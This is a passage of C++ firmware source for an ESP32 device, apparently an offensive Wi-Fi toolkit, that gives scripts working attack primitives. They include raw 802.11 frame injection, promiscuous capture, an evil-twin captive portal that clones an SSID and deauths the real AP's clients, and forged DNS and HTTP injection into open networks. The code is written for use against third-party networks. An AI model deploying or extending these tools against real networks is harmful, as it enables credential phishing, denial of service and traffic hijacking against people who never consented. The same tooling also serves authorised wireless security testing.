// passed as hex strings so a script can build any 802.11 frame it wants.
// Limits: frames are 10..1500 bytes and channels are 1-14; a capture holds at
// most 100 packets / 50KB and stops itself on its deadline.
// ============================================================================

// Parses "aabbcc", "AA:BB:CC", "aa bb cc" and "0xaabbcc" into bytes.
// Returns false on a missing frame, an odd number of hex digits or overflow.
static bool js_parse_hex_frame(const char *str, uint8_t *out, size_t cap, size_t *outLen) {
    if (str == NULL || out == NULL) return false;

    size_t n = 0;
    int hi = -1; // pending high nibble, -1 when between bytes
    for (const char *p = str; *p != '\0'; p++) {
        char c = *p;
        if (c == 'x' || c == 'X') { // tolerate 0x / 0X prefixes
            hi = -1;
            continue;
        }
        int v;
        if (c >= '0' && c <= '9') {
            v = c - '0';
        } else if (c >= 'a' && c <= 'f') {
            v = c - 'a' + 10;
        } else if (c >= 'A' && c <= 'F') {
            v = c - 'A' + 10;
        } else {
            continue; // skip separators
        }

        if (hi < 0) {
            hi = v;
            continue;
        }
        if (n >= cap) return false;
        out[n++] = (uint8_t)((hi << 4) | v);
        hi = -1;
    }

    if (hi >= 0) return false; // odd digit count
    if (outLen != NULL) *outLen = n;
    return n > 0;
}

static int js_int_arg(JSContext *ctx, JSValue *argv, int argc, int index, int fallback) {
    int value = fallback;
    if (argc > index && JS_IsNumber(ctx, argv[index])) JS_ToInt32(ctx, &value, argv[index]);
    return value;
}

static JSValue js_hex_string_from_bytes(JSContext *ctx, const uint8_t *data, uint16_t len) {
    static const char hexDigits[] = "0123456789abcdef";
    char *out = (char *)malloc((size_t)len * 2 + 1);
    if (out == NULL) {
        // Degrade to a null field rather than raising mid-way through the list.
        Serial.println("[WIFI_RAW] out of memory while formatting a captured packet");
        return JS_NULL;
    }

    for (uint16_t i = 0; i < len; i++) {
        out[i * 2] = hexDigits[(data[i] >> 4) & 0x0F];
        out[i * 2 + 1] = hexDigits[data[i] & 0x0F];
    }
    out[len * 2] = '\0';

    JSValue str = JS_NewStringLen(ctx, out, (size_t)len * 2);
    free(out);
    return str;
}

JSValue native_wifiInjectPacket(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.injectPacket(packetHex: string, channel?: int) -> boolean
    // Frames are sent through esp_wifi_80211_tx() with the AP callback bypassed.
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiInjectPacket(packetHex:string, channel?:int)");

    JSCStringBuf sb;
    const char *hex = JS_ToCString(ctx, argv[0], &sb);

    uint8_t frame[WIFI_RAW_MAX_FRAME];
    size_t len = 0;
    if (!js_parse_hex_frame(hex, frame, sizeof(frame), &len)) {
        Serial.println("[WIFI_RAW] injectPacket: frame is not valid hex (10-1500 bytes)");
        return JS_NewBool(false);
    }

    int channel = js_int_arg(ctx, argv, argc, 1, 1);
    if (channel < 1 || channel > 14) {
        Serial.println("[WIFI_RAW] injectPacket: channel must be 1-14");
        return JS_NewBool(false);
    }

    cleanlyStopWebUiForWiFiFeature();
    WifiRawTxResult r = wifi_raw_inject(frame, len, (uint8_t)channel, 1, -1, false, 0);
    if (!r.ok) {
        Serial.printf("[WIFI_RAW] injectPacket failed: %s\n", r.error != NULL ? r.error : "unknown error");
    }
    return JS_NewBool(r.ok);
}

JSValue native_wifiSendRaw80211(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.sendRaw80211(frameHex: string, channel?: int, options?: {
    //            repeat?: int,     // 1-64 transmissions (default 1)
    //            iface?: string,   // "auto" (default), "sta" or "ap"
    //            fcs?: bool,       // append a CRC32 FCS (default false)
    //            gapMs?: int       // delay between repeats, 0-100 (default 0)
    //        })
    // returns: { ok, sent, failed, len, channel, iface, error? }
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiSendRaw80211(frameHex:string, channel?:int, options?:object)");

    // Copied out immediately: 'hex' is read further down, after the option
    // lookups, each of which allocates and can relocate the string it points into.
    String hex = js_tocstring_copy(ctx, argv[0]);

    uint8_t frame[WIFI_RAW_MAX_FRAME];
    size_t len = 0;

    int channel = js_int_arg(ctx, argv, argc, 1, 1);
    int repeat = 1;
    int gapMs = 0;
    int iface = -1;
    bool appendFcs = false;

    if (argc > 2 && JS_IsObject(ctx, argv[2])) {
        JSValue jsvRepeat = JS_GetPropertyStr(ctx, argv[2], "repeat");
        if (!JS_IsUndefined(jsvRepeat) && JS_IsNumber(ctx, jsvRepeat)) JS_ToInt32(ctx, &repeat, jsvRepeat);

        JSValue jsvGap = JS_GetPropertyStr(ctx, argv[2], "gapMs");
        if (!JS_IsUndefined(jsvGap) && JS_IsNumber(ctx, jsvGap)) JS_ToInt32(ctx, &gapMs, jsvGap);

        JSValue jsvFcs = JS_GetPropertyStr(ctx, argv[2], "fcs");
        if (!JS_IsUndefined(jsvFcs)) appendFcs = JS_ToBool(ctx, jsvFcs);

        JSValue jsvIface = JS_GetPropertyStr(ctx, argv[2], "iface");
        if (!JS_IsUndefined(jsvIface) && JS_IsString(ctx, jsvIface)) {
            JSCStringBuf ib;
            const char *ifaceStr = JS_ToCString(ctx, jsvIface, &ib);
            if (ifaceStr != NULL) {
                if (strcasecmp(ifaceStr, "ap") == 0) {
                    iface = 1;
                } else if (strcasecmp(ifaceStr, "sta") == 0) {
                    iface = 0;
                }
            }
        }
    }

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = JS_NewObject(ctx);
    if (JS_IsException(*obj)) {
        JS_PopGCRef(ctx, &obj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }
    JS_SetPropertyStr(ctx, *obj, "channel", JS_NewInt32(ctx, channel));

    if (!js_parse_hex_frame(hex.c_str(), frame, sizeof(frame), &len)) {
        JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(false));
        JS_SetPropertyStr(ctx, *obj, "sent", JS_NewInt32(ctx, 0));
        JS_SetPropertyStr(ctx, *obj, "failed", JS_NewInt32(ctx, 0));
        JS_SetPropertyStr(ctx, *obj, "len", JS_NewInt32(ctx, 0));
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "frame is not valid hex (10-1500 bytes)"));
        return JS_PopGCRef(ctx, &obj_ref);
    }

    cleanlyStopWebUiForWiFiFeature();
    WifiRawTxResult r = wifi_raw_inject(
        frame,
        len,
        (uint8_t)channel,
        (uint8_t)repeat,
        iface,
        appendFcs,
        (uint32_t)(gapMs < 0 ? 0 : gapMs)
    );

    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(r.ok));
    JS_SetPropertyStr(ctx, *obj, "sent", JS_NewInt32(ctx, r.sent));
    JS_SetPropertyStr(ctx, *obj, "failed", JS_NewInt32(ctx, r.failed));
    JS_SetPropertyStr(ctx, *obj, "len", JS_NewInt32(ctx, r.len));
    JS_SetPropertyStr(ctx, *obj, "iface", JS_NewString(ctx, r.iface != NULL ? r.iface : "unknown"));
    if (r.error != NULL) JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, r.error));
    return JS_PopGCRef(ctx, &obj_ref);
}

JSValue native_wifiCaptureStart(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.captureStart(channel?: int, timeoutMs?: int) -> session id
    // Returns the session id (1 or 2) on success, -1 on failure. timeoutMs is
    // 200-60000 ms; 0 (or omitted) defaults to 5000 ms.
    int channel = js_int_arg(ctx, argv, argc, 0, 1);
    int timeoutMs = js_int_arg(ctx, argv, argc, 1, 5000);
    if (channel < 1 || channel > 14) {
        Serial.println("[WIFI_RAW] captureStart: channel must be 1-14");
        return JS_NewInt32(ctx, -1);
    }
    if (timeoutMs < 0) timeoutMs = 0;

    cleanlyStopWebUiForWiFiFeature();
    int sessionId = wifi_raw_capture_start((uint8_t)channel, (uint32_t)timeoutMs);
    return JS_NewInt32(ctx, sessionId);
}

JSValue native_wifiCaptureStop(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.captureStop(sessionId: int) -> boolean
    // Packets captured so far stay readable until the session slot is reused.
    if (argc < 1 || !JS_IsNumber(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiCaptureStop(sessionId:int)");

    int sessionId = 0;
    JS_ToInt32(ctx, &sessionId, argv[0]);
    return JS_NewBool(wifi_raw_capture_stop(sessionId));
}

JSValue native_wifiGetCapturedPackets(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.getCapturedPackets(sessionId: int, maxPackets?: int)
    // returns: [{ timestamp, channel, rssi, data: "hexstring" }, ...]
    if (argc < 1 || !JS_IsNumber(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiGetCapturedPackets(sessionId:int, maxPackets?:int)");

    int sessionId = 0;
    JS_ToInt32(ctx, &sessionId, argv[0]);

    wifi_raw_capture_poll(); // reap the session first if its deadline passed

    int count = wifi_raw_capture_packet_count(sessionId);
    if (count < 0) return JS_ThrowInternalError(ctx, "wifiGetCapturedPackets: unknown session %d", sessionId);

    int maxPackets = js_int_arg(ctx, argv, argc, 1, count);
    if (maxPackets < 0) maxPackets = 0;
    if (maxPackets > count) maxPackets = count;

    // mquickjs has a compacting GC: it relocates every live object, and it can
    // run inside any allocation (js_malloc() -> check_free_mem() -> JS_GC() ->
    // gc_compact_heap()). The only roots are the JS value stack and the
    // registered JSGCRef chain - the C stack is never scanned - so a JSValue
    // kept in a plain C local is neither kept alive nor still valid once one of
    // the allocations below runs the GC. Each packet's hex string is up to twice
    // WIFI_RAW_MAX_FRAME, so a large read does reach the GC threshold; the
    // result array was being collected/relocated underneath this loop and the
    // caller then received a dangling JSValue, which reports typeof "object"
    // (js_eq_get_type() maps any unknown mtag to JS_ETAG_OBJECT) but throws
    // "cannot read property 'length' of value" on the first property read.
    // Pin the array and re-read it after every allocation.
    JSGCRef arr_ref;
    JSValue *arr = JS_PushGCRef(ctx, &arr_ref);
    *arr = JS_NewArray(ctx, maxPackets);
    if (JS_IsException(*arr)) {
        JS_PopGCRef(ctx, &arr_ref);
        // JS_NewArray() returns a bare JS_EXCEPTION when its backing store
        // allocation fails, and that path does not always raise an exception
        // object, so raise one here rather than returning an unset exception.
        return JS_ThrowOutOfMemory(ctx);
    }

    uint32_t written = 0;
    for (int i = 0; i < maxPackets; i++) {
        uint32_t timestamp = 0;
        uint8_t channel = 0;
        int8_t rssi = 0;
        const uint8_t *data = NULL;
        uint16_t len = 0;
        if (!wifi_raw_capture_packet(sessionId, i, &timestamp, &channel, &rssi, &data, &len)) continue;

        JSGCRef obj_ref;
        JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
        *obj = JS_NewObject(ctx);
        if (JS_IsException(*obj)) {
            JS_PopGCRef(ctx, &obj_ref);
            JS_PopGCRef(ctx, &arr_ref);
            return JS_EXCEPTION; // out of memory is already raised
        }

        JS_SetPropertyStr(ctx, *obj, "timestamp", JS_NewInt32(ctx, (int)timestamp));
        JS_SetPropertyStr(ctx, *obj, "channel", JS_NewInt32(ctx, (int)channel));
        JS_SetPropertyStr(ctx, *obj, "rssi", JS_NewInt32(ctx, (int)rssi));
        // Build the string first: it is the one allocation here big enough to
        // trigger a GC, and *obj must not be read until after it has run.
        JSValue hex = js_hex_string_from_bytes(ctx, data, len);
        if (JS_IsException(hex)) {
            JS_PopGCRef(ctx, &obj_ref);
            JS_PopGCRef(ctx, &arr_ref);
            return JS_EXCEPTION;
        }
        JS_SetPropertyStr(ctx, *obj, "data", hex);
        JS_SetPropertyUint32(ctx, *arr, written++, *obj);
        JS_PopGCRef(ctx, &obj_ref);
    }
    return JS_PopGCRef(ctx, &arr_ref);
}

JSValue native_wifiSetPromiscuous(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.setPromiscuous(enable: bool, channel?: int) -> boolean
    // Turning promiscuous reception off also stops any running capture.
    bool enable = true;
    if (argc > 0) enable = JS_ToBool(ctx, argv[0]);

    int channel = js_int_arg(ctx, argv, argc, 1, 0);
    if (channel != 0 && (channel < 1 || channel > 14)) {
        Serial.println("[WIFI_RAW] setPromiscuous: channel must be 1-14");
        return JS_NewBool(false);
    }

    cleanlyStopWebUiForWiFiFeature();
    return JS_NewBool(wifi_raw_set_promiscuous(enable, (uint8_t)channel));
}

// ============================================================================
// Generic captive portal (evil twin) binding.
//
// wifi.portal() serves whatever page or redirect the script hands it, so one
// binding covers a rickroll, a fake router login, a splash page and so on. The
// twin AP is open and cloned from the SSID the script names; when a target BSSID
// is supplied its clients are pushed over with deauth frames. The call blocks
// until the deadline expires or the back button is pressed, and always tears the
// AP + servers down again.
// ============================================================================

static bool js_get_string_prop(JSContext *ctx, JSValue obj, const char *name, String *out) {
    JSValue v = JS_GetPropertyStr(ctx, obj, name);
    if (JS_IsUndefined(v) || !JS_IsString(ctx, v)) return false;
    JSCStringBuf sb;
    const char *s = JS_ToCString(ctx, v, &sb);
    if (s == NULL) return false;
    *out = s;
    return true;
}

static bool js_get_int_prop(JSContext *ctx, JSValue obj, const char *name, int *out) {
    JSValue v = JS_GetPropertyStr(ctx, obj, name);
    if (JS_IsUndefined(v) || !JS_IsNumber(ctx, v)) return false;
    JS_ToInt32(ctx, out, v);
    return true;
}

static bool js_get_bool_prop(JSContext *ctx, JSValue obj, const char *name, bool *out) {
    JSValue v = JS_GetPropertyStr(ctx, obj, name);
    if (JS_IsUndefined(v)) return false;
    *out = JS_ToBool(ctx, v);
    return true;
}

JSValue native_wifiPortal(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.portal(ssid: string, channel?: int, options?: {
    //            html?: string,       // page served for every request
    //            htmlFile?: string,   // page loaded from SD/LittleFS when html is absent
    //            redirect?: string,   // 302 target for every request (beats html)
    //            durationMs?: int,    // 2000-600000, default 60000
    //            deauth?: bool,       // kick clients off the real AP
    //            bssid?: string,      // real AP to deauth, required by deauth:true
    //            password?: string,   // twin AP password, empty = open
    //            dns?: bool,          // hijack every DNS name (default true)
    //            gateway?: string,    // twin IP, default bruceConfig.evilPortalGatewayIp
    //            maxClients?: int     // 1-8, default 4
    //        })
    // returns: { ok, ssid, channel, ip, requests, deauthFrames, clients, elapsedMs, error? }
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiPortal(ssid:string, channel?:int, options?:object)");

    JSCStringBuf sb;
    const char *ssidStr = JS_ToCString(ctx, argv[0], &sb);

    WifiPortalConfig cfg;
    cfg.ssid = ssidStr != NULL ? ssidStr : "";
    cfg.channel = (uint8_t)js_int_arg(ctx, argv, argc, 1, 6);

    int durationMs = 60000;
    int maxClients = 4;
    if (argc > 2 && JS_IsObject(ctx, argv[2])) {
        JSValue opts = argv[2];
        js_get_string_prop(ctx, opts, "html", &cfg.html);
        js_get_string_prop(ctx, opts, "htmlFile", &cfg.htmlFile);
        js_get_string_prop(ctx, opts, "redirect", &cfg.redirect);
        js_get_string_prop(ctx, opts, "password", &cfg.password);
        js_get_string_prop(ctx, opts, "gateway", &cfg.gateway);
        js_get_int_prop(ctx, opts, "durationMs", &durationMs);
        js_get_int_prop(ctx, opts, "maxClients", &maxClients);
        js_get_bool_prop(ctx, opts, "deauth", &cfg.deauth);
        js_get_bool_prop(ctx, opts, "dns", &cfg.hijackDns);

        String bssidStr;
        if (js_get_string_prop(ctx, opts, "bssid", &bssidStr)) {
            if (js_parse_bssid(bssidStr.c_str(), cfg.targetBssid)) cfg.hasTargetBssid = true;
        }
    }

    cfg.durationMs = durationMs < 0 ? 0 : (uint32_t)durationMs;
    if (maxClients < 1) maxClients = 1;
    if (maxClients > 8) maxClients = 8;
    cfg.maxClients = (uint8_t)maxClients;

    WifiPortalStats st = wifi_portal_run(cfg);
    if (!st.ok && st.error != NULL) {
        Serial.printf("[PORTAL] failed: %s\n", st.error);
    }

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = JS_NewObject(ctx);
    if (JS_IsException(*obj)) {
        JS_PopGCRef(ctx, &obj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }
    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(st.ok));
    JS_SetPropertyStr(ctx, *obj, "ssid", JS_NewString(ctx, cfg.ssid.c_str()));
    JS_SetPropertyStr(ctx, *obj, "channel", JS_NewInt32(ctx, (int)cfg.channel));
    JS_SetPropertyStr(ctx, *obj, "ip", JS_NewString(ctx, st.ip.c_str()));
    JS_SetPropertyStr(ctx, *obj, "requests", JS_NewInt32(ctx, (int)st.requests));
    JS_SetPropertyStr(ctx, *obj, "deauthFrames", JS_NewInt32(ctx, (int)st.deauthFrames));
    JS_SetPropertyStr(ctx, *obj, "clients", JS_NewInt32(ctx, st.clients));
    JS_SetPropertyStr(ctx, *obj, "elapsedMs", JS_NewInt32(ctx, (int)st.elapsedMs));
    if (st.error != NULL) JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, st.error));
    return JS_PopGCRef(ctx, &obj_ref);
}

// ============================================================================
// Application layer injection bindings: DNS replies and HTTP payloads.
//
// wifi.packetInfo() decodes a captured frame (ports, seq/ack, DNS id/name) and
// the injectors below build a full 802.11 data frame around a forged UDP or TCP
// payload. Reach: open/WEP networks only, because a WPA2 client only accepts
// frames encrypted with its pairwise key. Everything is bounded - payloads are
// capped at WIFI_L4_MAX_PAYLOAD (1400) bytes, repeat at 64.
// ============================================================================

static const uint8_t wifi_js_broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static JSValue js_ip_string(JSContext *ctx, uint32_t ip) {
    char buf[16];
    snprintf(
        buf,
        sizeof(buf),
        "%u.%u.%u.%u",
        (unsigned)((ip >> 24) & 0xFF),
        (unsigned)((ip >> 16) & 0xFF),
        (unsigned)((ip >> 8) & 0xFF),
        (unsigned)(ip & 0xFF)
    );
    return JS_NewString(ctx, buf);
}

static JSValue js_mac_string(JSContext *ctx, const uint8_t *mac) {
    char buf[18];
    snprintf(
        buf,
        sizeof(buf),
        "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0],
        mac[1],
        mac[2],
        mac[3],
        mac[4],
        mac[5]
    );
    return JS_NewString(ctx, buf);
}

// Shared option parsing + injection for the HTTP/TCP bindings. It reads
// clientMac (argv[0]), serverIp (argv[1]), channel (argv[3]) and options
// (argv[4]) and sends `httpPayload` as a TCP data segment.
static JSValue wifi_js_http_inject(JSContext *ctx, JSValue *argv, int argc, const String &httpPayload, int status) {
    // Both are read well after the object below is built (serverIpStr even at the
    // very end), so they must own their bytes rather than borrow heap pointers.
    String macStr = js_tocstring_copy(ctx, argv[0]);
    String serverIpStr = js_tocstring_copy(ctx, argv[1]);

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = JS_NewObject(ctx);
    if (JS_IsException(*obj)) {
        JS_PopGCRef(ctx, &obj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }
    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(false));
    JS_SetPropertyStr(ctx, *obj, "frames", JS_NewInt32(ctx, 0));
    JS_SetPropertyStr(ctx, *obj, "status", JS_NewInt32(ctx, status));
    JS_SetPropertyStr(ctx, *obj, "payloadLen", JS_NewInt32(ctx, (int)httpPayload.length()));

    uint8_t clientMac[6];
    if (!js_parse_bssid(macStr.c_str(), clientMac)) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "clientMac must look like AA:BB:CC:DD:EE:FF"));
        return JS_PopGCRef(ctx, &obj_ref);
    }
    uint32_t serverIp = 0;
    if (!wifi_parse_ipv4(serverIpStr.c_str(), &serverIp)) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "serverIp must be a dotted quad"));
        return JS_PopGCRef(ctx, &obj_ref);
    }

    uint8_t bssid[6];
    memcpy(bssid, wifi_js_broadcast_mac, 6);
    uint32_t dstIp = 0xFFFFFFFFu; // broadcast: accepted without knowing the client's IP
    uint32_t seq = 0;
    uint32_t ack = 1;
    int srcPort = 80;
    int dstPort = 80;
    int flags = 0x18; // PSH + ACK
    int repeat = 3;
    int gapMs = 0;
    int channel = js_int_arg(ctx, argv, argc, 3, 1);

    if (argc > 4 && JS_IsObject(ctx, argv[4])) {
        String tmp;
        uint32_t parsedIp = 0;
        if (js_get_string_prop(ctx, argv[4], "bssid", &tmp) && js_parse_bssid(tmp.c_str(), bssid)) {}
        if (js_get_string_prop(ctx, argv[4], "dstIp", &tmp) && wifi_parse_ipv4(tmp.c_str(), &parsedIp)) {
            dstIp = parsedIp;
        }
        js_get_int_prop(ctx, argv[4], "srcPort", &srcPort);
        js_get_int_prop(ctx, argv[4], "dstPort", &dstPort);
        js_get_int_prop(ctx, argv[4], "flags", &flags);
        js_get_int_prop(ctx, argv[4], "repeat", &repeat);
        js_get_int_prop(ctx, argv[4], "gapMs", &gapMs);
        // seq/ack are full 32 bit values, so read them unsigned.
        JSValue jsSeq = JS_GetPropertyStr(ctx, argv[4], "seq");
        if (!JS_IsUndefined(jsSeq) && JS_IsNumber(ctx, jsSeq)) JS_ToUint32(ctx, &seq, jsSeq);
        JSValue jsAck = JS_GetPropertyStr(ctx, argv[4], "ack");
        if (!JS_IsUndefined(jsAck) && JS_IsNumber(ctx, jsAck)) JS_ToUint32(ctx, &ack, jsAck);
    }

    if (channel < 1 || channel > 14) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "channel must be 1-14"));
        return JS_PopGCRef(ctx, &obj_ref);
    }
    if (srcPort < 1 || srcPort > 65535 || dstPort < 1 || dstPort > 65535) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "ports must be 1-65535"));
        return JS_PopGCRef(ctx, &obj_ref);
    }
    if (httpPayload.length() > WIFI_L4_MAX_PAYLOAD) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "payload too large (max 1400 bytes)"));
        return JS_PopGCRef(ctx, &obj_ref);
    }

    WifiL4Result r = wifi_inject_tcp(
        clientMac,
        bssid,
        serverIp,
        dstIp,
        (uint16_t)srcPort,
        (uint16_t)dstPort,
        seq,
        ack,
        (uint8_t)flags,
        (const uint8_t *)httpPayload.c_str(),
        httpPayload.length(),
        (uint8_t)channel,
        (uint8_t)repeat,
        (uint32_t)(gapMs < 0 ? 0 : gapMs)
    );

    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(r.ok));
    JS_SetPropertyStr(ctx, *obj, "frames", JS_NewInt32(ctx, r.frames));
    JS_SetPropertyStr(ctx, *obj, "len", JS_NewInt32(ctx, r.len));
    JS_SetPropertyStr(ctx, *obj, "channel", JS_NewInt32(ctx, (int)channel));
    JS_SetPropertyStr(ctx, *obj, "clientMac", js_mac_string(ctx, clientMac));
    JS_SetPropertyStr(ctx, *obj, "serverIp", JS_NewString(ctx, serverIpStr.c_str()));
    JS_SetPropertyStr(ctx, *obj, "dstIp", js_ip_string(ctx, dstIp));
    JS_SetPropertyStr(ctx, *obj, "seq", JS_NewUint32(ctx, seq));
    JS_SetPropertyStr(ctx, *obj, "ack", JS_NewUint32(ctx, ack));
    JS_SetPropertyStr(ctx, *obj, "srcPort", JS_NewInt32(ctx, srcPort));
    JS_SetPropertyStr(ctx, *obj, "dstPort", JS_NewInt32(ctx, dstPort));
    if (r.error != NULL) JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, r.error));
    return JS_PopGCRef(ctx, &obj_ref);
}

JSValue native_wifiInjectDns(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.injectDns(clientMac, domain, answerIp, channel?, options?: {
    //            bssid?: string,   // the AP's BSSID (addr2/addr3); default broadcast
    //            srcIp?: string,   // DNS server to spoof, e.g. the client's gateway
    //            dstIp?: string,   // client IP; default 255.255.255.255 (broadcast)
    //            srcPort?: int,    // default 53
    //            dstPort?: int,    // the client's query source port, from the capture
    //            txid?: int,       // transaction id of the client's query
    //            ttl?: int,        // answer TTL, default 300
    //            repeat?: int,     // 1-64 transmissions, default 3
    //            gapMs?: int       // delay between them, default 0
    //        })
    // returns: { ok, frames, len, payloadLen, channel, clientMac, domain,
    //            answerIp, srcIp, dstIp, dstPort, txid, error? }
    if (argc < 3 || !JS_IsString(ctx, argv[0]) || !JS_IsString(ctx, argv[1]) || !JS_IsString(ctx, argv[2]))
        return JS_ThrowTypeError(
            ctx, "wifiInjectDns(clientMac:string, domain:string, answerIp:string, channel?:int, options?:object)"
        );

    // These three are read again much later (domain/answerIpStr build the DNS
    // answer below), so they must own their bytes rather than borrow heap pointers.
    String macStr = js_tocstring_copy(ctx, argv[0]);
    String domain = js_tocstring_copy(ctx, argv[1]);
    String answerIpStr = js_tocstring_copy(ctx, argv[2]);

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = JS_NewObject(ctx);
    if (JS_IsException(*obj)) {
        JS_PopGCRef(ctx, &obj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }
    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(false));
    JS_SetPropertyStr(ctx, *obj, "frames", JS_NewInt32(ctx, 0));
    JS_SetPropertyStr(ctx, *obj, "domain", JS_NewString(ctx, domain.c_str()));
    JS_SetPropertyStr(ctx, *obj, "answerIp", JS_NewString(ctx, answerIpStr.c_str()));

    uint8_t clientMac[6];
    if (!js_parse_bssid(macStr.c_str(), clientMac)) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "clientMac must look like AA:BB:CC:DD:EE:FF"));
        return JS_PopGCRef(ctx, &obj_ref);
    }

    uint8_t bssid[6];
    memcpy(bssid, wifi_js_broadcast_mac, 6);
    uint32_t srcIp = 0, dstIp = 0xFFFFFFFFu; // broadcast until told otherwise
    bool haveSrcIp = false;
    int srcPort = 53;
    int dstPort = 53;
    int ttl = 300;
    int repeat = 3;
    int gapMs = 0;
    int txid = -1;
    int channel = js_int_arg(ctx, argv, argc, 3, 1);

    if (argc > 4 && JS_IsObject(ctx, argv[4])) {
        String tmp;
        uint32_t parsedIp = 0;
        if (js_get_string_prop(ctx, argv[4], "bssid", &tmp) && js_parse_bssid(tmp.c_str(), bssid)) {}
        if (js_get_string_prop(ctx, argv[4], "srcIp", &tmp) && wifi_parse_ipv4(tmp.c_str(), &parsedIp)) {
            srcIp = parsedIp;
            haveSrcIp = true;
        }
        if (js_get_string_prop(ctx, argv[4], "dstIp", &tmp) && wifi_parse_ipv4(tmp.c_str(), &parsedIp)) {
            dstIp = parsedIp;
        }
        js_get_int_prop(ctx, argv[4], "srcPort", &srcPort);
        js_get_int_prop(ctx, argv[4], "dstPort", &dstPort);
        js_get_int_prop(ctx, argv[4], "ttl", &ttl);
        js_get_int_prop(ctx, argv[4], "repeat", &repeat);
        js_get_int_prop(ctx, argv[4], "gapMs", &gapMs);
        js_get_int_prop(ctx, argv[4], "txid", &txid);
    }

    if (!haveSrcIp) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "options.srcIp is required (the DNS server to spoof)"));
        return JS_PopGCRef(ctx, &obj_ref);
    }
    if (channel < 1 || channel > 14) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "channel must be 1-14"));
        return JS_PopGCRef(ctx, &obj_ref);
    }
    if (srcPort < 1 || srcPort > 65535 || dstPort < 1 || dstPort > 65535) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "ports must be 1-65535"));
        return JS_PopGCRef(ctx, &obj_ref);
    }
    if (txid < 0 || txid > 65535) txid = random(0, 65535);
    if (ttl < 0) ttl = 0;

    uint8_t dnsPayload[512];
    size_t dnsLen = wifi_build_dns_response(
        dnsPayload, sizeof(dnsPayload), (uint16_t)txid, domain.c_str(), answerIpStr.c_str(), (uint32_t)ttl
    );
    if (dnsLen == 0) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "could not build the DNS answer (domain/answerIp)"));
        return JS_PopGCRef(ctx, &obj_ref);
    }

    WifiL4Result r = wifi_inject_udp(
        clientMac,
        bssid,
        srcIp,
        dstIp,
        (uint16_t)srcPort,
        (uint16_t)dstPort,
        dnsPayload,
        dnsLen,
        (uint8_t)channel,
        (uint8_t)repeat,
        (uint32_t)(gapMs < 0 ? 0 : gapMs)
    );

    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(r.ok));
    JS_SetPropertyStr(ctx, *obj, "frames", JS_NewInt32(ctx, r.frames));
    JS_SetPropertyStr(ctx, *obj, "len", JS_NewInt32(ctx, r.len));
    JS_SetPropertyStr(ctx, *obj, "payloadLen", JS_NewInt32(ctx, (int)dnsLen));
    JS_SetPropertyStr(ctx, *obj, "channel", JS_NewInt32(ctx, (int)channel));
    JS_SetPropertyStr(ctx, *obj, "clientMac", js_mac_string(ctx, clientMac));
    JS_SetPropertyStr(ctx, *obj, "bssid", js_mac_string(ctx, bssid));
    JS_SetPropertyStr(ctx, *obj, "srcIp", js_ip_string(ctx, srcIp));
    JS_SetPropertyStr(ctx, *obj, "dstIp", js_ip_string(ctx, dstIp));
    JS_SetPropertyStr(ctx, *obj, "srcPort", JS_NewInt32(ctx, srcPort));
    JS_SetPropertyStr(ctx, *obj, "dstPort", JS_NewInt32(ctx, dstPort));
    JS_SetPropertyStr(ctx, *obj, "txid", JS_NewInt32(ctx, txid));
    if (r.error != NULL) JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, r.error));
    return JS_PopGCRef(ctx, &obj_ref);
}

JSValue native_wifiInjectHttp(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.injectHttp(clientMac, serverIp, payload, channel?, options?)
